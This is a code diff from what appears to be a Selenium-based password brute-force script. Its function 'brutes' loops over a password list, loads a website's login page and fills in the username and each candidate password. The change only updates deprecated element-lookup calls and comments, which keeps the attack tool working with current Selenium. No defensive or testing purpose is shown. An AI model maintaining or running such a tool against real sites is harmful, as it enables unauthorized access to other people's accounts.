@@ -88,9 +88,9 @@ def brutes(username, username_selector ,password_selector,login_btn_selector,pas
             for line in f:
                 browser.get(website)
                 wait.until(EC.presence_of_element_located((By.CSS_SELECTOR, login_btn_selector)))
-                Sel_user = browser.find_element_by_css_selector(username_selector) #Finds Selector
-                Sel_pas = browser.find_element_by_css_selector(password_selector) #Finds Selector
-                enter = browser.find_element_by_css_selector(login_btn_selector) #Finds Selector
+                Sel_user = browser.find_element(By.CSS_SELECTOR, username_selector) #finds the username selector
+                Sel_pas = browser.find_element(By.CSS_SELECTOR, password_selector) #finds the password selector
+                enter = browser.find_element(By.CSS_SELECTOR, login_btn_selector) #finds the login button
                 Sel_user.send_keys(username)
                 Sel_pas.send_keys(line)
                 print ('------------------------')
